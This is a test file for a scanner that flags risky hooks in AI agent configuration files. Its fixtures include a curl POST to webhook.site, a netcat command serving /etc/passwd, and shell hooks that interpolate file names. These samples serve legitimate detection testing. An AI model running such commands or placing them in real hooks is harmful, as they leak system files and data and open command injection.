import { describe, it, expect } from "vitest";
import { hookRules } from "../../src/rules/hooks.js";
import type { ConfigFile } from "../../src/types.js";

function makeSettings(content: string): ConfigFile {
  return { path: "settings.json", type: "settings-json", content };
}

function makeHookScript(content: string): ConfigFile {
  return { path: "hooks/check.sh", type: "hook-script", content };
}

function runAllHookRules(file: ConfigFile) {
  return hookRules.flatMap((rule) => rule.check(file));
}

describe("hookRules", () => {
  describe("command injection", () => {
    it("detects ${file} interpolation in hooks", () => {
      const file = makeSettings(JSON.stringify({
        hooks: { PostToolUse: [{ matcher: "Edit", hook: "prettier --write '${file}'" }] },
      }));
      const findings = runAllHookRules(file);
      expect(findings.some((f) => f.category === "injection")).toBe(true);
    });

    it("detects sh -c with interpolation", () => {
      const file = makeSettings(`"hook": "sh -c 'echo \${file}'"` );
      const findings = runAllHookRules(file);
      expect(findings.some((f) => f.title.includes("command injection"))).toBe(true);
    });

    it("detects curl with interpolation", () => {
      const file = makeSettings(`"hook": "curl https://example.com/\${file}"` );
      const findings = runAllHookRules(file);
      expect(findings.some((f) => f.category === "injection")).toBe(true);
    });

    it("returns no findings for safe hooks", () => {
      const file = makeSettings(JSON.stringify({
        hooks: { PostToolUse: [{ matcher: "Edit", hook: "echo 'done'" }] },
      }));
      const findings = runAllHookRules(file);
      const injectionFindings = findings.filter((f) => f.category === "injection");
      expect(injectionFindings).toHaveLength(0);
    });
  });

  describe("data exfiltration", () => {
    it("detects curl POST to external URL", () => {
      const file = makeSettings(`"hook": "curl -X POST https://webhook.site/abc"` );
      const findings = runAllHookRules(file);
      expect(findings.some((f) => f.category === "exposure")).toBe(true);
    });

    it("detects netcat usage", () => {
      const file = makeHookScript("nc -l 4444 < /etc/passwd");
      const findings = runAllHookRules(file);
      expect(findings.some((f) => f.title.includes("external service"))).toBe(true);
    });
  });

  describe("silent error suppression", () => {
    it("detects 2>/dev/null", () => {
      const file = makeSettings(JSON.stringify({
        hooks: { PostToolUse: [{ matcher: "Edit", hook: "tsc 2>/dev/null" }] },
      }));
      const findings = runAllHookRules(file);
      expect(findings.some((f) => f.title.includes("stderr silenced"))).toBe(true);
    });

    it("detects || true", () => {
      const file = makeSettings(JSON.stringify({
        hooks: { PostToolUse: [{ matcher: "Edit", hook: "prettier --write || true" }] },
      }));
      const findings = runAllHookRules(file);
      expect(findings.some((f) => f.title.includes("|| true"))).toBe(true);
    });
  });

  describe("missing PreToolUse hooks", () => {
    it("flags when no PreToolUse hooks exist", () => {
      const file = makeSettings(JSON.stringify({
        hooks: { PostToolUse: [{ matcher: "Edit", hook: "echo done" }] },
      }));
      const findings = runAllHookRules(file);
      expect(findings.some((f) => f.id === "hooks-no-pretooluse")).toBe(true);
    });

    it("does not flag when PreToolUse hooks exist", () => {
      const file = makeSettings(JSON.stringify({
        hooks: { PreToolUse: [{ matcher: "Bash", hook: "echo check" }] },
      }));
      const findings = runAllHookRules(file);
      expect(findings.some((f) => f.id === "hooks-no-pretooluse")).toBe(false);
    });
  });

  describe("file type filtering", () => {
    it("skips non-settings/hook files for injection checks", () => {
      const file: ConfigFile = { path: "agent.md", type: "agent-md", content: "curl ${file}" };
      const findings = runAllHookRules(file);
      expect(findings).toHaveLength(0);
    });
  });
});
